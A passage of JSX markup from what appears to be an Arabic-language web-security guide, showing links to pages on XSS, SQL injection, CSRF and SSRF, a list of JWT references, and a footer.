              <p className="text-sm text-gray-400 mt-1">Cross-Site Scripting</p>
            </Link>

            <Link
              href="/vulnerabilities/sqli"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-purple-600 transition-colors block"
            >
              <h3 className="font-bold text-purple-300">🗄️ ثغرات SQL Injection</h3>
              <p className="text-sm text-gray-400 mt-1">حقن SQL</p>
            </Link>

            <Link
              href="/vulnerabilities/csrf"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-purple-600 transition-colors block"
            >
              <h3 className="font-bold text-purple-300">🔄 ثغرات CSRF</h3>
              <p className="text-sm text-gray-400 mt-1">Cross-Site Request Forgery</p>
            </Link>

            <Link
              href="/vulnerabilities/ssrf"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-purple-600 transition-colors block"
            >
              <h3 className="font-bold text-purple-300">🌐 ثغرات SSRF</h3>
              <p className="text-sm text-gray-400 mt-1">Server-Side Request Forgery</p>
            </Link>
          </div>
        </section>

        {/* References */}
        <section className="bg-gray-800 rounded-xl p-6 border border-gray-700">
          <h2 className="text-xl font-bold text-purple-300 mb-4">📚 مراجع ومصادر</h2>
          <ul className="space-y-2 text-sm text-gray-300">
            <li>• <a href="https://jwt.io/" target="_blank" className="text-blue-400 hover:underline">jwt.io</a> - محرر JWT</li>
            <li>• <a href="https://datatracker.ietf.org/doc/html/rfc7519" target="_blank" className="text-blue-400 hover:underline">RFC 7519</a> - المعيار الرسمي</li>
            <li>• <a href="https://portswigger.net/web-security/jwt" target="_blank" className="text-blue-400 hover:underline">PortSwigger</a> - أكاديمية JWT</li>
            <li>• <a href="https://github.com/ticarpi/jwt_tool" target="_blank" className="text-blue-400 hover:underline">jwt_tool</a> - أداة اختبار JWT</li>
            <li>• <a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" target="_blank" className="text-blue-400 hover:underline">OWASP JWT Cheat Sheet</a></li>
          </ul>
        </section>
      </main>

      {/* Footer */}
      <footer className="bg-gray-800 border-t border-gray-700 py-8">
        <div className="container mx-auto px-4 text-center text-gray-400 text-sm">
          <p>دليل أمن الويب الشامل - جميع الحقوق محفوظة © 2024</p>
        </div>
      </footer>
    </div>
  );
}